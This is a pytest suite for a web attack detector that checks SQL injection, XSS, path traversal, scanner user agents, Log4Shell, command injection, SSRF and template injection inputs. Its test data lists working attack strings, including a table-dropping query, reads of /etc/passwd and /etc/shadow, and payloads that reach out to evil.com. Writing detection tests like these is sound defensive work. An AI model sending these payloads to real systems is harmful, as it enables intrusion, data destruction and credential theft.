"""Tests — WebRules: SQLi, XSS, Path Traversal, UA, Payload"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest
from rules.web_rules import WebRules


@pytest.fixture
def web():
    return WebRules()


class TestSQLi:
    PAYLOADS = [
        "1 UNION SELECT username,password FROM users--",
        "' OR '1'='1",
        "1; DROP TABLE users;--",
        "1 AND SLEEP(5)",
        "id=1' AND 1=1--",
        "GET /login?id=1%20UNION%20SELECT%20null,null--",
    ]

    def test_all_sqli_patterns_detected(self, web):
        for payload in self.PAYLOADS:
            result = web.detect_sqli(payload, "1.2.3.4")
            assert result is not None, f"Missed SQLi: {payload}"
            assert result.to_dict()["severity"] == "HIGH"

    def test_legitimate_sql_not_detected(self, web):
        legit = [
            "SELECT COUNT(*) FROM sessions",
            "normal search query",
            "username=alice&password=secret123",
        ]
        for payload in legit:
            result = web.detect_sqli(payload, "192.168.1.1")
            assert result is None, f"False positive: {payload}"

    def test_url_encoded_sqli_detected(self, web):
        result = web.detect_sqli("1%20UNION%20SELECT%20null%2Cnull--", "1.2.3.4")
        assert result is not None


class TestXSS:
    PAYLOADS = [
        "<script>alert(1)</script>",
        '<img src=x onerror="alert(1)">',
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        '"><script>fetch("http://evil.com")</script>',
    ]

    def test_all_xss_patterns_detected(self, web):
        for payload in self.PAYLOADS:
            result = web.detect_xss(payload, "1.2.3.4")
            assert result is not None, f"Missed XSS: {payload}"

    def test_html_entities_decoded(self, web):
        # &#60;script&#62; should decode to <script>
        result = web.detect_xss("&#60;script&#62;alert(1)&#60;/script&#62;", "1.2.3.4")
        assert result is not None

    def test_normal_html_not_detected(self, web):
        legit = ["<p>Hello world</p>", "<div class='main'>content</div>"]
        for h in legit:
            result = web.detect_xss(h, "192.168.1.1")
            assert result is None, f"False positive: {h}"


class TestPathTraversal:
    PAYLOADS = [
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2fetc%2fpasswd",
        "/var/www/../../etc/shadow",
    ]

    def test_traversal_detected(self, web):
        for path in self.PAYLOADS:
            result = web.detect_path_traversal(path, "1.2.3.4")
            assert result is not None, f"Missed traversal: {path}"

    def test_normal_path_not_detected(self, web):
        legit = ["/index.html", "/assets/logo.png", "/api/v1/users"]
        for p in legit:
            result = web.detect_path_traversal(p, "192.168.1.1")
            assert result is None


class TestSuspiciousUA:
    def test_scanners_detected(self, web):
        scanners = ["sqlmap/1.7", "nikto/2.1", "nmap/7.94", "python-requests/2.28"]
        for ua in scanners:
            result = web.detect_suspicious_ua(ua, "1.2.3.4")
            assert result is not None, f"Missed scanner UA: {ua}"

    def test_legitimate_browsers_not_detected(self, web):
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        ]
        for ua in browsers:
            result = web.detect_suspicious_ua(ua, "192.168.1.1")
            assert result is None, f"False positive UA: {ua}"


class TestSuspiciousPayload:
    def test_log4shell_detected(self, web):
        result = web.detect_suspicious_payload("${jndi:ldap://evil.com/a}", "1.2.3.4")
        assert result is not None
        assert result.to_dict()["severity"] == "CRITICAL"

    def test_rce_pipe_detected(self, web):
        result = web.detect_suspicious_payload("; cat /etc/passwd", "1.2.3.4")
        assert result is not None

    def test_ssrf_metadata_detected(self, web):
        result = web.detect_suspicious_payload("http://169.254.169.254/latest/meta-data/", "1.2.3.4")
        assert result is not None

    def test_ssti_detected(self, web):
        result = web.detect_suspicious_payload("{{7*7}}", "1.2.3.4")
        assert result is not None


class TestAnalyzePayload:
    def test_combined_analysis(self, web):
        alerts = web.analyze_payload(
            payload="1 UNION SELECT null--",
            source_ip="1.2.3.4",
            user_agent="sqlmap/1.7",
            path="/normal/path",
        )
        rule_ids = {a.to_dict()["rule_id"] for a in alerts}
        assert "W-R1" in rule_ids  # SQLi
        assert "W-R4" in rule_ids  # UA

    def test_empty_inputs_no_alerts(self, web):
        alerts = web.analyze_payload(payload="", source_ip="1.2.3.4")
        assert alerts == []
